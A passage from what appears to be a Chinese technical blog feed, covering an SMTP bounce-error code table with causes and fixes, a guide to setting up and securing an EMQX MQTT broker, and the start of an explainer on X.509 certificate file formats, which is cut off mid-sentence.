AUTH若没有设定好，会出现此项错误讯息。</td><td>在账号设定的「服务器」中点选「SMTP服务器需要认证」。</td><td></td></tr><tr><td>550</td><td>The Recipient’s Server Is Down</td><td>收信者的邮件服务器停机中</td></tr><tr><td>收信端邮件服务器停机中。</td><td>请收信者与网络管理员联络看看邮件服务器何时能够上线。</td><td></td></tr><tr><td>550</td><td>Change To Part of the Email Address To Achieve a Successful Delivery</td><td>信件中的To必须改为正确的邮件账号</td></tr><tr><td>有些公司已经改了自身的域名，因此要求发件人更正收信端邮件账号中的网域名部分。</td><td>在邮件中更正邮件账号中的网域名之后重新寄送一次。</td><td></td></tr><tr><td>550</td><td>[suspend]mailbox Currently Suspended - Please Contact Correspondent Directly</td><td>邮件信箱目前被停权，请自行与收信者用其他方式联络</td></tr><tr><td>收信端邮件信箱目前被停权。</td><td>请寄信者与收信者用其他方式取得联络</td><td></td></tr><tr><td>550</td><td>Incorrect From Address</td><td>邮件中From的邮件地址不正确</td></tr><tr><td>有些ISP禁止寄信者使用非自家维护的域名来寄信。</td><td>请与ISP做沟通协调或是换一家ISP。</td><td></td></tr><tr><td>550</td><td>Mailbox Temporarily Disabled</td><td>邮件信箱暂时被停用</td></tr><tr><td>收信端邮件信箱可能已满尚未整理或是收信者尚未缴纳费用。</td><td>请与收信者使用其他方式联系</td><td></td></tr><tr><td>550</td><td>1. Unrouteable Address</td><td>1. 无效的邮件地址</td></tr><tr><td>收信端的DNS服务器无法解析收信者网域</td><td>检查收件者邮件地址是否正确</td><td></td></tr><tr><td>550</td><td>Mailbox Is Inactive</td><td>邮件信箱尚未开通</td></tr><tr><td>收信端邮件账号尚未开通。</td><td>寄信者应通知收信者其邮件信箱尚未开通，并请ISP将信箱账号开通以供使用。</td><td></td></tr><tr><td>550</td><td>Relay Not Permitted</td><td>禁止转寄</td></tr><tr><td>收件方邮件服务器未正确设定管理之网域</td><td>通知对方系统管理者</td><td></td></tr><tr><td>550</td><td>The Smtp Service To Send As Other Account Parties Is Not Valid For Your Account</td><td>您的邮件账户设定不允许以他人名义发信</td></tr><tr><td>发出信件的发件人账户与使用的 SMTP 账户不同</td><td>请系统管理者更改此设定或发件人账户与SMTP账户以相同账户发信</td><td></td></tr><tr><td>550 5.1.2</td><td>Host Unknown – Host Cannot Be Found</td><td>不明的主机 - 找不到收信者的邮件服务器主机</td></tr><tr><td>DNS指向设定错误造成无法解析收信者端邮件服务器。</td><td>请邮递员检测DNS是否正常。</td><td></td></tr><tr><td>550 5.1.3</td><td>Storedrv.submit; Invalid Recipient Address</td><td>无效的收信者邮件地址</td></tr><tr><td>此错误讯息为MS Exchange Server 2007特有。</td><td>提醒使用者检查收信者的邮件地址是否符合语法规则</td><td></td></tr><tr><td>550 5.4.1</td><td>1. Recipient Address Rejected - Access Denied 2. Internet Security Systems’ Proventia? Intrusion Prevention Appliance Blocked Forwarding of Message</td><td>1. 收信者端拒绝收信 2. 因特网安全系统的入侵防止机制阻挡了邮件</td></tr><tr><td>寄信端IP地址或是寄信端邮件服务器IP地址被列入黑名单中。</td><td>请通知收信端邮件管理者将寄信端邮件账号加入白名单。</td><td></td></tr><tr><td>550 5.7.1</td><td>1. Unable To Relay For 2. Mail From Ip Address Refused By Blackhole Site Dialups.mail-abuse.org 3. Relaying Prohibited</td><td>1. 寄信者的信件无法传递 2. 寄信者的IP地址已被锁定为黑名单 3. 禁止传送此信件</td></tr><tr><td>当遇到这类讯息时，表示收信端邮件服务器将寄信端账号或是寄信端的网域名放入黑名单中。</td><td>请与收信者端邮递员做沟通，加以漂白。</td><td></td></tr><tr><td>550 5.7.1</td><td>Our System Has Detected an Unusual Rate of Unsolicited Mail Originating From Your Ip Address. To Protect Our Users From Spam, Mail Sent From Your Ip Address Has Been Blocked. Please Visit Http://<a href="http://www.google.com/mail/help/bulk_mail.html">www.google.com/mail/help/bulk_mail.html</a> To Review Our Bulk Email Senders Guidelines</td><td>Google: 因发现不当的大量邮件来自你的 IP 地址，你的 IP 地址已被禁止寄入 GMAIL</td></tr><tr><td>发送大量邮件至 Gmail</td><td>依照大量邮件发送规范，重新检视你的电子邮件是否有不当之处． <a href="http://www.google.com/mail/help/bulk_mail.html">http://www.google.com/mail/help/bulk_mail.html</a></td><td></td></tr><tr><td>551</td><td>1. User Not Local Or Invalid Address –relay Denied 2. Delivery Not Allowed To Non-local Recipient</td><td>1. 邮件服务器知道使用者不属于本地端拒绝做传递信的服务 2. 对于非本地的使用者不提供邮件传递的服务</td></tr><tr><td>有些ISP为了要抵挡垃圾信乱飞的现象，他们索性对其他网域的使用者不提供传递信件的服务。</td><td>1. 解决方式是打电话给这些ISP证明发件人非垃圾信制造者。 2. 换一家ISP。</td><td></td></tr><tr><td>552</td><td>Requested Mail Action Aborted: Exceeded Storage Allocation</td><td>所要求的动作中断：超出所分配的储存空间，邮件将退回给发件人</td></tr><tr><td>收信端邮件信箱容量已达上限</td><td>建议发件人通知收信者将信件清理一番</td><td></td></tr><tr><td>552</td><td>Size of the Incoming Message Exceeds the Incoming Size Limit</td><td>新进信件的大小超过单笔新进信件的上限</td></tr><tr><td>新进信件的大小超过单笔新进信件的上限。</td><td>将欲寄信件分多笔寄出。2. 收信者与邮递员联络并将上限值做一个调整。</td><td></td></tr><tr><td>552</td><td>Too Many Recipients</td><td>单封邮件中的收信者太多</td></tr><tr><td>单封邮件中的收信者太多。</td><td>建议分多笔邮件寄出。</td><td></td></tr><tr><td>552</td><td>Too Much Mail Data</td><td>单封邮件中数据量过大</td></tr><tr><td>单封邮件中数据量过大。</td><td>建议将数据分散在多笔邮件中寄出。</td><td></td></tr><tr><td>552</td><td>Request Mail Action Aborted: Your are Not Allowed To Use Maillist Account</td><td>所要求的邮件动作中断 - 不能用maillist的账号</td></tr><tr><td>寄信者没有使用大量寄信功能的权限。</td><td>请与邮递员确认权限。</td><td></td></tr><tr><td>552</td><td>Sorry, We Don’t Allow Mail From Your Host</td><td>寄信者所在主机不被允许寄信</td></tr><tr><td>寄信者所在主机不被允许寄信。</td><td>检查寄信端邮件账号是否被放进拒绝名单中。</td><td></td></tr><tr><td>552</td><td>Requested Mail Action Aborted:too Many Recipients, Limited Is 150</td><td>收信者数量超过限制的150位</td></tr><tr><td>单封邮件的收信者数量超过上限。</td><td>1. 降低一次收信端邮件账号的数量。 2. 分批寄信。</td><td></td></tr><tr><td>552 5.1.1</td><td>Sorry, Mailbox <a href="mailto:&#65;&#x6c;&#97;&#110;&#64;&#116;&#x68;&#x69;&#115;&#99;&#x6f;&#109;&#x70;&#97;&#x6e;&#x79;&#46;&#99;&#111;&#109;">&#65;&#x6c;&#97;&#110;&#64;&#116;&#x68;&#x69;&#115;&#99;&#x6f;&#109;&#x70;&#97;&#x6e;&#x79;&#46;&#99;&#111;&#109;</a> Is Over Quota Temporarily</td><td>很抱歉，<a href="mailto:&#65;&#x6c;&#x61;&#110;&#x40;&#x54;&#104;&#105;&#x73;&#x43;&#111;&#109;&#112;&#x61;&#110;&#121;&#46;&#x63;&#x6f;&#109;">&#65;&#x6c;&#x61;&#110;&#x40;&#x54;&#104;&#105;&#x73;&#x43;&#111;&#109;&#112;&#x61;&#110;&#121;&#46;&#x63;&#x6f;&#109;</a>这个信箱容量暂时超过上限</td></tr><tr><td>收信端邮件账号信箱容量暂时超过上限。</td><td>可通知收件者清理邮件信箱腾出空间来收信。</td><td></td></tr><tr><td>552 5.2.3</td><td>1. Data Size Exceeds Maximum Permitted 2. Message Exceeds Maximum Fixed Size</td><td>1. 数据大小超出允许的最大值 2. 邮件超出预设的最大值</td></tr><tr><td>单笔邮件数据大小还有信件大小超出允许的最大值。</td><td>1.请缩小单笔邮件的大小，可将一封邮件切为多封邮件来传送 。 2.请收信端通邮递员将收信上限提高。 3. 若是还是无法寄送，可以考虑使用FTP的传输方式来传送</td><td></td></tr><tr><td>552 5.3.4</td><td>Error: Message File Too Big</td><td>电子邮件讯息太大</td></tr><tr><td>寄出的邮件可能包含过大的附件文件</td><td>请缩小附件文件大小再试一次</td><td></td></tr><tr><td>553</td><td>1. Requested Action Not Taken: Mailbox Name Not Allowed [e.g. Mailbox Syntax Incorrect] 2. There Is an Invalid Email Address in the To, Cc Or Bcc Field of the Email Message 3.</td><td>1. 信件里的TO， CC， BCC有无效的收信者信箱地址 2. 不明的邮件地址，放弃传递</td></tr><tr><td>因收信端邮件账号无效或错误出现此讯息</td><td>请确认每一个收信端邮件账号都是有效的</td><td></td></tr><tr><td>553</td><td>Sorry, Relaying Denied From Your Location</td><td>抱歉，无法从寄信者的所在地或是因特网联机发送信件</td></tr><tr><td>有些ISP为了要抵挡垃圾信乱飞的现象，他们索性对其他网域的使用者不提供传递信件的服务。</td><td>1. 解决方式是打电话给这些ISP证明发件人非垃圾信制造者。 2. 换一家ISP。</td><td></td></tr><tr><td>553</td><td>1. Relay Restriction 2. From &lt;&gt; Message Blocked 3. Sorry, You are Not Allow To Use This Smtp To Relay Your Email 4. Sorry, That Domain Isn’t in My List of Allowed Rcpt Hosts</td><td>1. 传送邮件是受到限制 2. 由发件人的身份寄信时遭到拒绝 3. 抱歉，发件人无法使用这个SMTP服务器来传递邮件 4. 抱歉，此网域不在SMTP服务器的允许寄送名单中</td></tr><tr><td>在寄送信件之前必须先经过身份认证</td><td>请在Outlook里的「我的 SMTP 服务器需要验证」打勾来启动 SMTP Auth 的功能</td><td></td></tr><tr><td>553</td><td>Authentication Is Required To Send Mail As</td><td>在寄送信件之前必须先经过身份认证</td></tr><tr><td>在Outlook或是Outlook Express里使用，若没有设定我的服务器需要验证，会出现此项错误讯息</td><td>请在Outlook里的「我的 SMTP 服务器需要验证」打勾来启动 SMTP Auth 的功能</td><td></td></tr><tr><td>553</td><td>Mailbox Name Not Allowed</td><td>收件人邮箱地址不合语法</td></tr><tr><td>收信端邮件账号不合语法</td><td>需检查收信端邮件账号是否正确</td><td></td></tr><tr><td>553</td><td>Sorry, Your Envelop Sender Is in My Bad Mail From List</td><td>抱歉，寄信者电子邮件地址(邮件内)在黑名单中</td></tr><tr><td>收信端邮件服务器限制了寄信端电子邮件地址</td><td>1. 通知收信端邮递员将之放行 2. 更改邮件的发件人电子邮件地址</td><td></td></tr><tr><td>553</td><td>Specified Domain Is Not Allowed</td><td>收信端邮件服务器拒收来自特定网域的信件</td></tr><tr><td>收信端邮件服务器拒收来自特定网域的信件</td><td>请通知收信端邮递员将发件人所属网域名从黑名单中剔除</td><td></td></tr><tr><td>553 5.1.3</td><td>User Address Required!</td><td>需要输入邮件账号</td></tr><tr><td>信件中收信端邮件账号错误</td><td>请确认收信端邮件账号输入无误</td><td></td></tr><tr><td>553 5.1.3</td><td>Invalid Local Part</td><td>电子邮件收件者帐户部分错误</td></tr><tr><td>可能使用了有 BUG 的邮件软件如 Outlook Express 导致寄出 这样的邮件</td><td>重设通讯簿，尝试将问题信箱设定一个全名，或更换更好的邮件软件</td><td></td></tr><tr><td>553 5.1.8</td><td>Domain of Sender Address Does Not Exist</td><td>发信者的网域不存在</td></tr><tr><td>1. 寄信端的DNS服务器故障 2. 收信端的DNS服务器故障 3. 发件人信箱网域部分打错字</td><td>检查邮件软件内设定的发件人电子邮件地址网域部分是否打错字</td><td></td></tr><tr><td>554</td><td>1. Transaction Failed 2. Delivery Error: This User Doesn’t Have a Yahoo.com Account 3. Sorry Your Message ToCannot Be Delivered. This Account Has Been Disabled Or Discontinued</td><td>1. 传输失败 2. 收件者没有雅虎的邮件账号 3. 收件者的账号可能被停用或是收件者已经不在使用此邮件账号</td></tr><tr><td>1. 收信端邮件账号错误</td><td>1. 请检查收信端网域名 2. 是否拼错字 3. 请检查收信端邮件账号是否存在或是被停用</td><td></td></tr><tr><td>554</td><td>1. Smtp Relay Service Does Not Allow Your Ip Address To Relay Mail To <a href="mailto:&#x58;&#120;&#120;&#64;&#120;&#x78;&#x78;&#46;&#x78;&#x78;&#120;">&#x58;&#120;&#120;&#64;&#120;&#x78;&#x78;&#46;&#x78;&#x78;&#120;</a> 2. Smtp Service Does Not Allow Your Ip Address 3. Client Host Rejected: Access Denied</td><td>1. SMTP寄信服务不允许寄信者的IP地址传递信件给 <a href="mailto:&#x78;&#120;&#x78;&#64;&#120;&#x78;&#x78;&#46;&#120;&#120;&#x78;">&#x78;&#120;&#x78;&#64;&#120;&#x78;&#x78;&#46;&#120;&#120;&#x78;</a> 2. SMTP寄信服务不允许寄信者的IP地址传递信件 3. 客户端被拒绝登入：存取拒绝</td></tr><tr><td>寄信端邮件服务器为杜绝计算机病毒以及被当作垃圾信跳板，使用者必须经过 SMTP Auth 的身份认证才能寄信</td><td>1. 请在Outlook里的「我的服务器需要验证」打勾来启动 SMTP Auth 的功能 2. 强烈建议任何寄信者需经过 SMTP Auth 的身份认证，若需要 Open Relay 则需要手动加入寄信者的IP地址</td><td></td></tr><tr><td>554</td><td>1. (x.x.x.x) Was Found On One Or More Dnsbls, See Http://help.comcast.net/content/faq/bl000010 2. Recipient Address Rejected 3. Service Unavailable; Client Host (x.x.x.x) Blocked Using Barracuda Reputation; Http://recipientdomain.barracudacentral.com/q.cgi?ip= (554 5.7.1) 4. Your Access To This Mail System Has Been Rejected Due To the Sending Mta’s Poor Reputation. If You Believe That This Failure Is in Error, Please Contact the Intended Recipient Via Alternate Means</td><td>1. 发件人的邮件服务器IP地址出现在DNSBLs中，详情请到下列网页察看： <a href="http://help.comcast.net/content/faq/BL000010">http://help.comcast.net/content/faq/BL000010</a> 2. 拒绝收信者邮件地址 3. 寄信者的IP地址为反垃圾信机制所阻挡 4. 由于发件人的邮件服务器有发垃圾信的坏名誉纪录，收信者的邮件服务器拒收</td></tr><tr><td>寄信端IP地址或邮件服务器的IP地址被放入黑名单</td><td>1. 请与收信端邮件服务器管理员联系商讨是否可以将寄件端IP地址解除锁定 2. 请寄信端邮递员或是所属ISP工作人员与RBL相关网站接洽讨论是否能从黑名单中除名</td><td></td></tr><tr><td>554</td><td>Your Ip (x.x.x.x) Is Dynamic Ip Address, Use Your Isp Smtp Server Instead</td><td>您的IP地址视为动态IP地址，请使用您 ISP 的 SMTP 服务器</td></tr><tr><td>收件端邮件服务器不接受动态IP地址上的邮件服务器</td><td>请向您的ISP申请固定IP来架设邮件服务器</td><td></td></tr><tr><td>554</td><td>Your Ip (x.x.x.x) Was Listed in Dsbl - Please Visit Http://dsbl.org/listing?x.x.x.x For More Details</td><td>寄信者的IP地址被收录在DSBL名单中，详情请看 <a href="http://dsbl.org/listing?x.x.x.x">http://dsbl.org/listing?x.x.x.x</a></td></tr><tr><td>请不用担心这个黑名单，因为dsbl.org在2009年初已经下线。</td><td>N/A</td><td></td></tr><tr><td>554 5.3.0</td><td>Mail Server Permanently Rejected Message</td><td>邮件服务器永久地拒绝此邮件</td></tr><tr><td>信件内容可能被对方过滤器阻挡</td><td>请与收件端邮件管理者联系将发件人网域或IP地址加入白名单以跳过过滤机制</td><td></td></tr><tr><td>554 5.7.1</td><td>The File Xxx Has Been Blocked. File Quarantined As:b100493a.xxx</td><td>档案XXX已被隔离放置于隔离区内。文件名为：b100493a.XXX。</td></tr><tr><td>此档案极有可能含计算机病毒。</td><td>请使用防病毒软件扫瞄处理。</td><td></td></tr><tr><td>571</td><td>1. Email Address We Do Not Relay 2. the Following Addresses Had Permanent Delivery Errors: <a href="mailto:&#88;&#x78;&#x78;&#x40;&#120;&#120;&#120;&#46;&#x78;&#x78;&#120;">&#88;&#x78;&#x78;&#x40;&#120;&#120;&#120;&#46;&#x78;&#x78;&#120;</a></td><td>1. 我们无法为此收件者传递邮件(不提供转寄) 2. 此收信邮件账号有永久性收件上的问题：<a href="mailto:&#120;&#120;&#x78;&#64;&#x78;&#x78;&#x78;&#46;&#120;&#120;&#x78;">&#120;&#120;&#x78;&#64;&#x78;&#x78;&#x78;&#46;&#120;&#120;&#x78;</a></td></tr><tr><td>原因一：收件者邮件服务器设定错误，误认自己不代管收件者网域 原因二：寄信者没经过 SMTP Auth (我的外寄服务器(SMTP)需要认证) 的验证寄信模式 原因三：不被允许做寄信的动作 原因四：寄信端邮件服务器在黑名单中</td><td>原因一：收件者邮件服务器设定错误，误认自己不代管收件者网域 原因二：寄信者没经过 SMTP Auth (我的外寄服务器(SMTP)需要认证) 的验证寄信模式 原因三：不被允许做寄信的动作 原因四：寄信端邮件服务器在黑名单中</td><td></td></tr></tbody></table><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/chenfei_5201213/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">10138969</span> -所有错误码<br><br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/kerry0071/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">28604267</span>?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task -介绍+常见错误码<br><br>https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/yd1227/</span>archive<span class="hljs-regexp">/2011/</span><span class="hljs-number">01</span><span class="hljs-regexp">/19/</span><span class="hljs-number">1939096</span>.html 注入<br><br>https:<span class="hljs-regexp">//</span>www.sqlsec.com<span class="hljs-regexp">/2017/</span><span class="hljs-number">08</span>/smtp.html  -案例<br><br>https:<span class="hljs-regexp">//</span>www.jianshu.com<span class="hljs-regexp">/p/</span><span class="hljs-number">3228</span>edf53c42 -案例<br><br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/fageweiketang/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">94394885</span>?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task -案例<br><br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/tpnndhqc/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">51240678</span> -详细的命令<br><br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/kerry0071/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">28604267</span>?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task -SMTP介绍<br><br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/qq_35644234/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">68961603</span> -SMTP介绍<br><br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/gruhgd/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">86701742</span>  -SASL - 简单认证和安全层<br><br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/ly_6118/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">89637270</span> -linux下smtp服务器搭建(安全配置)<br><br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/weixin_42746624/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">81129935</span>?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task<br>-linux下smtp服务器搭建(安全配置)<br><br>https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/flytor/</span>p/<span class="hljs-number">11448035</span>.html   --Linux中Postfix邮件认证配置<br><br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/my98800/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">78592492</span>  -IMAP SMTP POP3区别<br><br><br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/skythesea/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">79825197</span>   -邮件服务器添加SPF、DKIM、DMARC、PTR<br><br>https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/rain99/</span>articles/<span class="hljs-number">10418798</span>.html --smtp服务器认证状态与不认证状态<br><br>https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/mail-safe/</span>p/<span class="hljs-number">10620938</span>.html  --邮件安全之邮件加密初探<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>POP3</tag>
      
      <tag>SMTP</tag>
      
      <tag>IMAP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux搭建mqtt环境</title>
    <link href="/2021/08/22/Linux%E6%90%AD%E5%BB%BAMQTT/"/>
    <url>/2021/08/22/Linux%E6%90%AD%E5%BB%BAMQTT/</url>
    
    <content type="html"><![CDATA[<h2 id="选择Broker"><a href="#选择Broker" class="headerlink" title="选择Broker"></a>选择Broker</h2><p>目前主流的Broker有以下3个：</p><ul><li><p> <a href="https://mosquitto.org/">Mosquitto</a>  ，下载地址：<code>http://mosquitto.org/files/binary/</code></p></li><li><p><a href="https://vernemq.com/">VerneMQ</a></p></li><li><p><a href="http://emqtt.io/">EMQTT</a></p></li></ul><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>使用<code>EMQTT</code>搭建mqtt环境</p><h3 id="1-下载对应版本的安装包"><a href="#1-下载对应版本的安装包" class="headerlink" title="1. 下载对应版本的安装包"></a>1. 下载对应版本的安装包</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.emqx.io/downloads<span class="hljs-comment">#broker</span><br></code></pre></td></tr></table></figure><h3 id="2-解压并运行"><a href="#2-解压并运行" class="headerlink" title="2. 解压并运行"></a>2. 解压并运行</h3><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">emqx <span class="hljs-built_in">console</span><br></code></pre></td></tr></table></figure><h3 id="3-访问web监控平台"><a href="#3-访问web监控平台" class="headerlink" title="3.访问web监控平台"></a>3.访问web监控平台</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">2.2</span>:<span class="hljs-number">18083</span>/<br></code></pre></td></tr></table></figure><h3 id="4-本地连接测试"><a href="#4-本地连接测试" class="headerlink" title="4. 本地连接测试"></a>4. 本地连接测试</h3><h4 id="4-1-连接工具下载"><a href="#4-1-连接工具下载" class="headerlink" title="4.1 连接工具下载"></a>4.1 连接工具下载</h4><p>​    win7 64位系统，选择 org.eclipse.paho.ui.app-1.0.2-win32.win32.x86_64.zip</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>repo.eclipse.org<span class="hljs-regexp">/content/</span>repositories<span class="hljs-regexp">/paho-releases/</span>org<span class="hljs-regexp">/eclipse/</span>paho<span class="hljs-regexp">/org.eclipse.paho.ui.app/</span><span class="hljs-number">1.0</span>.<span class="hljs-number">2</span>/<br></code></pre></td></tr></table></figure><h2 id="emqtt常用命令"><a href="#emqtt常用命令" class="headerlink" title="emqtt常用命令"></a>emqtt常用命令</h2><table><thead><tr><th>命令</th><th>作用</th></tr></thead><tbody><tr><td>emqttd start</td><td>启动 emqtt 服务</td></tr><tr><td>emqttd stop</td><td>停止 emqtt 服务</td></tr><tr><td>emqttd restart</td><td>重启 emqtt 服务</td></tr><tr><td>emqttd_ctl status</td><td>查看 emqtt 服务状态</td></tr></tbody></table><h2 id="EMQTT安全设置"><a href="#EMQTT安全设置" class="headerlink" title="EMQTT安全设置"></a>EMQTT安全设置</h2><h3 id="用户密码认证"><a href="#用户密码认证" class="headerlink" title="用户密码认证"></a>用户密码认证</h3><p>默认情况下，emqtt 服务会启用匿名认证，也就是说连接 emqtt 的服务时，不需要任何的账号密码，就可以连接，但通常情况下，我们会对连接 emqtt 服务的账号和密码加以控制，这时我们就需要来修改 emqtt 的配置文件</p><h4 id="1-修改配置文件"><a href="#1-修改配置文件" class="headerlink" title="1. 修改配置文件"></a>1. 修改配置文件</h4><p><code>/emqtt/bin/etc/emq.conf</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//设置</span><br>mqtt.allow_anonymous=<span class="hljs-keyword">false</span><br></code></pre></td></tr></table></figure><h4 id="2-配置用户密码认证"><a href="#2-配置用户密码认证" class="headerlink" title="2. 配置用户密码认证"></a>2. 配置用户密码认证</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">vim /emqtt/emqttd/etc/plugins/emqx_auth_username.conf<br><br>auth.<span class="hljs-keyword">user</span><span class="hljs-number">.1</span>.username = <span class="hljs-keyword">admin</span> <br>auth.<span class="hljs-keyword">user</span><span class="hljs-number">.1</span>.<span class="hljs-keyword">password</span> = <span class="hljs-keyword">admin</span> <br><br>:wq<br></code></pre></td></tr></table></figure><h4 id="3-开启用户密码认证插件"><a href="#3-开启用户密码认证插件" class="headerlink" title="3. 开启用户密码认证插件"></a>3. 开启用户密码认证插件</h4><ul><li>第一种方式：emqttd_ctl plugins load emq_auth_username</li></ul><ul><li>第二种方式：在 web 管理控制台中开启该插件</li></ul><h4 id="4-重启服务"><a href="#4-重启服务" class="headerlink" title="4. 重启服务"></a>4. 重启服务</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">emqttd restart</span><br></code></pre></td></tr></table></figure><h3 id="Clientid-认证"><a href="#Clientid-认证" class="headerlink" title="Clientid 认证"></a>Clientid 认证</h3><p>编辑<code>/emqtt/emqttd/etc/plugins/emq_auth_clientid.conf</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//设置</span><br>auth.client<span class="hljs-number">.1</span>.clientid = clientid<br>auth.client<span class="hljs-number">.1</span>.password = root<br></code></pre></td></tr></table></figure><h4 id="1-开启-Clientid-认证插件"><a href="#1-开启-Clientid-认证插件" class="headerlink" title="1.开启 Clientid 认证插件"></a>1.开启 Clientid 认证插件</h4><ul><li>第一种方式：emqttd_ctl plugins load emq_auth_clientid</li></ul><ul><li>第二种方式：在 web 管理控制台中开启该插件</li></ul><h4 id="2-重启服务，使插件生效"><a href="#2-重启服务，使插件生效" class="headerlink" title="2. 重启服务，使插件生效"></a>2. 重启服务，使插件生效</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">emqttd restart</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>环境搭建</category>
      
    </categories>
    
    
    <tags>
      
      <tag>mqtt</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>证书体系</title>
    <link href="/2021/08/22/%E8%AF%81%E4%B9%A6%E4%BD%93%E7%B3%BB/"/>
    <url>/2021/08/22/%E8%AF%81%E4%B9%A6%E4%BD%93%E7%B3%BB/</url>
    
    <content type="html"><![CDATA[<h2 id="X509标准"><a href="#X509标准" class="headerlink" title="X509标准"></a>X509标准</h2><p>X.509 - 这是一种证书标准,主要定义了证书中应该包含哪些内容，证书主要包括颁发者和被办法者的信息,以及被颁发者的公钥，和CA机构对这些信息的认证，</p><ol><li>两种编码方式：</li></ol><ul><li><p>PEM - Privacy Enhanced Mail,打开看文本格式,以”—–BEGIN…”开头, “—–END…”结尾,内容是BASE64编码.</p><pre><code>  Apache和*NIX服务器偏向于使用这种编码格式.</code></pre></li><li><p>DER - Distinguished Encoding Rules,打开看是二进制格式,不可读.</p><p>Java和Windows服务器偏向于使用这种编码格式.</p></li></ul><ol><li>各种文件拓展名：</li></ol><ul><li>CRT - CRT应该是certificate的三个字母,其实还是证书的意思,常见于*NIX系统,有可能是PEM编码,也有可能是DER编码,大多数应该是PEM编码</li><li>CER - 还是certificate,还是证书,常见于Windows系统,同样的,可能是PEM编码,也可能是DER编码,大多数应该是DER编码.</li><li>KEY - 通常用来存放一个公钥或者私钥,<strong>并非X.509证书</strong>,编码同样的,可能是PEM,也可能是DER.</li><li>CSR - Certificate Signing Request,即证书签名请求,这个并不是证书,而是向权威证书颁发机构获得签名证书的申请,其核心内容是一个公钥(当然还附带了一些别的信息),在生成这个申请的时候,同时也会生成一个私钥</li><li>PFX/P12 - predecessor of 